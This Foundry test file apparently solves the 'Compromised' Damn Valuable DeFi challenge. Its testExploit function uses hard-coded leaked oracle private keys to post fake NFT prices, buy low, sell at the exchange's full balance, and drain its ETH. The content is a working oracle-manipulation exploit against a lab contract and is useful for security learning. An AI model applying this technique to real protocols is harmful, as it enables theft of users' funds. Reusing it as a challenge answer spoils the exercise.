// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";

contract Compromised is Test {
    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;

    Exchange internal exchange;
    TrustfulOracle internal trustfulOracle;
    TrustfulOracleInitializer internal trustfulOracleInitializer;
    DamnValuableNFT internal damnValuableNFT;
    address payable internal attacker;

    function setUp() public {
        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.deal(attacker, 0.1 ether);
        vm.label(attacker, "Attacker");
        assertEq(attacker.balance, 0.1 ether);

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint8 i = 0; i < arrLen; ) {
            vm.deal(sources[i], 2 ether);
            assertEq(sources[i].balance, 2 ether);
            unchecked {
                ++i;
            }
        }

        string[] memory symbols = new string[](3);
        for (uint8 i = 0; i < arrLen; ) {
            symbols[i] = "DVNFT";
            unchecked {
                ++i;
            }
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint8 i = 0; i < arrLen; ) {
            initialPrices[i] = INITIAL_NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        ).oracle();

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(trustfulOracle)
        );
        damnValuableNFT = exchange.token();

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        // private key oracle 1
        address oracle1 = vm.addr(
            0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        );
        emit log_named_address("oracle1:", oracle1);
        // private key oracle 2
        address oracle2 = vm.addr(
            0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        );
        emit log_named_address("oracle2:", oracle2);
        // post prices of 0 to oracle
        vm.prank(oracle1);
        trustfulOracle.postPrice("DVNFT", 0.1 ether);
        vm.prank(oracle2);
        trustfulOracle.postPrice("DVNFT", 0.1 ether);
        // we can now buy an NFT for 0.1 ether with attacker
        vm.prank(attacker);
        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
        // post new prices
        vm.prank(oracle1);
        trustfulOracle.postPrice(
            "DVNFT",
            EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether
        );
        vm.prank(oracle2);
        trustfulOracle.postPrice(
            "DVNFT",
            EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether
        );
        // sell nft as attacker
        vm.startPrank(attacker);
        damnValuableNFT.approve(address(exchange), 0);
        exchange.sellOne(tokenId);
        vm.stopPrank();
        // post prices back to normal
        vm.prank(oracle1);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(oracle2);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Attacker's ETH balance must have significantly increased
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        assertEq(damnValuableNFT.balanceOf(attacker), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
